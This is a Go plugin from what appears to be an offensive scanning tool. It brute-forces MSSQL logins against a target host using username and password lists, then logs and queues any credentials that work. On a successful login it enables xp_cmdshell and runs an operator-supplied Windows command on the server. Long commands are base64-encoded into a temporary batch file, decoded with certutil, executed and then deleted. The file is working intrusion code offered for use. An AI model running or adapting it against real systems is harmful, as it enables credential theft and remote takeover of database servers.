package plugins

import (
	"context"
	"database/sql"
	"encoding/base64"
	"errors"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"

	_ "github.com/denisenkom/go-mssqldb"
)

func MssqlScan(info *common.HostInfo) error {
	starttime := time.Now().Unix()
	for _, user := range info.Usernames {
		for _, pass := range info.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := MssqlConn(info, user, pass)
			if flag == true {
				return err
			} else {
				if time.Now().Unix()-starttime > (int64(len(info.Usernames)*len(info.Passwords)) * info.Timeout) {
					return errors.New("timeout.")
				}
			}
		}
	}
	return nil
}

func MssqlConn(info *common.HostInfo, user string, pass string) (flag bool, err error) {
	dataSourceName := fmt.Sprintf("server=%s;user id=%s;password=%s;port=%v;encrypt=disable;timeout=%v",
		info.Host, user, pass, info.Port, time.Duration(info.Timeout)*time.Second)
	db, err := sql.Open("mssql", dataSourceName)
	if err == nil {
		db.SetConnMaxLifetime(time.Duration(info.Timeout) * time.Second)
		db.SetConnMaxIdleTime(time.Duration(info.Timeout) * time.Second)
		db.SetMaxIdleConns(0)
		defer db.Close()
		err = db.Ping()
		if err == nil {
			result := fmt.Sprintf("[%s:%s] MSSQL credential %s/%s", info.Host, info.Port, user, pass)
			log.Println(result)
			if info.Queue != nil {
				vuln := common.Vuln{
					Host: info.Host,
					Port: info.Port,
					User: user,
					Pass: pass,
				}
				info.Queue.Push(vuln)
			}
			cmd := info.Command.WinCommand
			MssqlExec(db, cmd)
			flag = true

		}
	}
	return flag, err
}

func MssqlExec(db *sql.DB, cmd string) {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	res, err := db.QueryContext(ctx, "select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'")
	if err != nil {
		return
	}
	for res.Next() {
		var count int
		if err = res.Scan(&count); err != nil {
			return
		}
		if count > 0 {
			db.ExecContext(ctx, "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
			if len(cmd) > 128 {
				flag := 88
				cmd = base64.StdEncoding.EncodeToString([]byte(cmd))
				for i := 0; i <= len(cmd)/flag; i++ {
					var tmpcmd string
					if i == len(cmd)/flag && len(cmd)-(flag*(i+1))%flag > 0 {
						tmpcmd = cmd[i*flag:]
					} else {
						tmpcmd = cmd[i*flag : (i+1)*flag]
					}
					tmpcmd = fmt.Sprintf(`echo|set /p="%s">>%s/q147.bat`, tmpcmd, "%TMP%")
					db.ExecContext(ctx, fmt.Sprintf("exec master..xp_cmdshell '%s'", tmpcmd))
				}
				db.ExecContext(ctx, "exec master..xp_cmdshell 'certutil -f -decode %TMP%/q147.bat %TMP%/q147.bat'")
				db.ExecContext(ctx, "exec master..xp_cmdshell '%TMP%/q147.bat & del %TMP%\\q147.bat'")
			} else {
				db.ExecContext(ctx, fmt.Sprintf("exec master..xp_cmdshell '%s'", cmd))
			}
		}
	}
	return
}
